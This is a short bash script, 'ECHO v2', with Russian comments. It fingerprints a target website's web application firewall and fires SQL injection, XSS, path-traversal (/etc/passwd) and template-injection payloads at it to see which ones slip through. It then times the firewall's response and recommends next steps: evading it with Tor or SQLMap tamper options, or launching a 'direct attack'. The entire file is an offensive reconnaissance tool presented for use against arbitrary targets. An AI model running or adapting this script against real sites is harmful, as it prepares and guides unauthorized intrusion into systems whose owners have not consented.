#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

echo "[ECHO v2] Profiling WAF..."

HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
BODY=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)

# 1. Тип WAF
echo "[ECHO] Type:"
echo "$HEADERS" | grep -qi "cf-ray" && echo "  🛡️ Cloudflare" 
echo "$HEADERS" | grep -qi "x-amz-cf-id" && echo "  🛡️ AWS CloudFront"
echo "$HEADERS" | grep -qi "X-FortiWeb" && echo "  🛡️ FortiWeb"
echo "$BODY" | grep -qi "ModSecurity" && echo "  🛡️ ModSecurity"

# 2. Правила WAF (что блокирует)
echo "[ECHO] Rules:"
for p in "' OR '1'='1" "<script>" "../../etc/passwd" "1 UNION SELECT" "{{7*7}}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET?q=$p" 2>/dev/null)
    [ "$CODE" = "403" ] && echo "  🚫 SQLi blocked"
    [ "$CODE" = "406" ] && echo "  🚫 XSS blocked"
    [ "$CODE" != "403" ] && [ "$CODE" != "406" ] && [ "$CODE" != "000" ] && echo "  ✅ $p passed"
done

# 3. Время задержки WAF
N=$(curl -sk --max-time 5 "$TARGET" -o /dev/null -w '%{time_total}' 2>/dev/null)
S=$(curl -sk --max-time 5 "$TARGET?id=1' OR '1'='1" -o /dev/null -w '%{time_total}' 2>/dev/null)
DIFF=$(python3 -c "print(int(($S-$N)*1000))" 2>/dev/null)
echo "[ECHO] Latency: ${DIFF:-0}ms"

# 4. Рекомендация
[ "${DIFF:-0}" -gt 200 ] && echo "[ECHO] 💡 Heavy WAF — use Psycho v2 + Tor"
[ "${DIFF:-0}" -gt 100 ] && echo "[ECHO] 💡 Medium WAF — use SQLMap Evasion"
[ "${DIFF:-0}" -lt 100 ] && echo "[ECHO] 💡 Light/No WAF — direct attack"
